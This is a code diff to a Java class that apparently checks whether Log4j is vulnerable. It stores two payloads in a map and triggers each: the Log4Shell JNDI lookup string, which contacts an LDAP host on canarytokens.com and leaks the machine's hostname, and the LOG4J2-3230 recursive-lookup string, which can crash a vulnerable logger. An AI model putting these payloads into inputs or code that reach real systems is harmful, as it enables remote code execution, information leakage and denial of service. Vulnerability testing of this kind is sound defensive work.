@@ -6,8 +6,19 @@ import org.apache.logging.log4j.Logger;
 import org.apache.logging.log4j.core.Core;
 import org.apache.logging.log4j.core.config.DefaultConfiguration;
 
+import java.util.LinkedHashMap;
+import java.util.Map;
+
 public class Main implements Runnable {
+    private final static Map<String, String> GADGETS = new LinkedHashMap<>();
     static {
+        GADGETS.put(
+            "CVE-2021-44228",
+            "${jndi:ldap://x${hostName}.L4J.cyvu6gfqc6sd34ii51nht76in.canarytokens.com/a}");
+        GADGETS.put(
+            "LOG4J2-3230",
+            "${${::-${::-$${::-j}}}}");
+
         System.setProperty("com.sun.jndi.ldap.connect.timeout", "1000");
         System.setProperty("com.sun.jndi.ldap.read.timeout", "1000");
         System.setProperty(DefaultConfiguration.DEFAULT_LEVEL, Level.INFO.toString());
@@ -27,11 +38,7 @@ public class Main implements Runnable {
 
     @Override
     public void run() {
-        final String CVE_2021_4428 = "${jndi:ldap://x${hostName}.L4J.cyvu6gfqc6sd34ii51nht76in.canarytokens.com/a}";
-        trigger("CVE-2021-44228", CVE_2021_4428);
-
-        final String LOG4J2_3230 = "${${::-${::-$${::-j}}}}";
-        trigger("LOG4J2-3230", LOG4J2_3230);
+        GADGETS.forEach(this::trigger);
     }
 
     private void trigger(
